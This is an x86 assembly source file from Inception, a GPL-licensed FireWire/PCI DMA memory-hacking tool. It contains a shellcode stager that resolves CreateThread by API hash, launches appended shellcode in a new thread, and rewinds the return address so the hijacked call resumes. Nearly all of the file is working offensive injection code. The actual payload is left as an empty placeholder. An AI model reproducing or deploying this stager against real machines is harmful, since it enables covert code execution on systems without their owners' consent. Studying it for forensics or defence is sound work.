; Inception - a FireWire physical memory manipulation and hacking tool exploiting
; PCI-based and IEEE 1394 SBP-2 DMA.

; Copyright (C) 2011-2014  Carsten Maartmann-Moe

; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.

; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.

; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.

; Created on Sep 6, 2011

; @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
[BITS 32]
[ORG 0]

  cld
  call start
delta:
%include "block_api.asm"
start:
  pop ebp                           ; pop off the address of 'api_call' for calling later.
  xor eax, eax                      ; zero out eax
  push eax                          ; 0
  push eax                          ; 0
  push eax                          ; 0
  lea ebx, [ebp+threadstart-delta]
  push ebx                          ; &threadstart
  push eax                          ; 0
  push eax                          ; 0
  push 0x160D6838                   ; hash( "kernel32.dll", "CreateThread" )
  call ebp                          ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
  popa                              ; A
  sub dword [esp], 5	              ; length of original call (5 bytes)
  ret
threadstart:
  pop eax                           ; pop off the unused thread param so the prepended shellcode can just return when done.
shellcode:
  ; woohoo
